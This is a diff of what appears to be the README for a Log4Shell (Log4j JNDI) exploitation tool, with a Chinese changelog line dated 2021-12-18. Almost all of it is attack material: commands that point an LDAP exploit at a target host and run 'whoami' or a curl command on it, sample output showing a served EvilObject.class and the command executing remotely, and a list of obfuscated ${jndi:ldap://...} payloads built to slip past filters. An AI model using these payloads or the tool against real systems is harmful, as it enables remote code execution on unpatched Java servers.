@@ -27,12 +27,12 @@ java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
 java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true
 
 
+# 2021-12-18 优化了细节
 
 1. 新增LOG4J相关检测
 > java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/
 [-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
 [-] LDAP Listening on 0.0.0.0:80
-[*] Have connection from /xx.xx.xx.xx:34850 /EvilObject.class
 [-] remote target jdk version: java/1.8.0_131, use payload version: jdk8
 [-] send payload done
 [-] waiting result...
@@ -45,6 +45,7 @@ root
 [-] start exploit.
 [-] input class: tomcat, command: curl xx.xx.xx
 [*] Send data...
+[-] exit.
 
 
 > java -cp jndi_tool.jar jndi.log4j.Tamper "\${jndi:ldap://127.0.0.1/a}"  random=true
@@ -53,7 +54,7 @@ root
 --------------------------------------------------
 ${jndi:ldap://127.0.0.1/a}
 ${j${upper:n}d${upper:i}:l${upper:d}${upper:a}p://127.0.0.1/a}
-${j${upper:n}d${upper:${upper:谋}}:l${upper:d}${upper:a}p://127.0.0.1/a}
+${j${upper:n}d${upper:${upper:i}}:l${upper:d}${upper:a}p://127.0.0.1/a}
 ${j${lower:n}d${lower:i}:l${lower:d}${lower:a}p://127.0.0.1/a}
 ${j${::-n}d${::-i}:l${::-d}${::-a}p://127.0.0.1/a}
 ${j${Omhc:qBz:-n}d${b:Hz:-i}:l${vX::-d}${puF:A:-a}p://127.0.0.1/a}
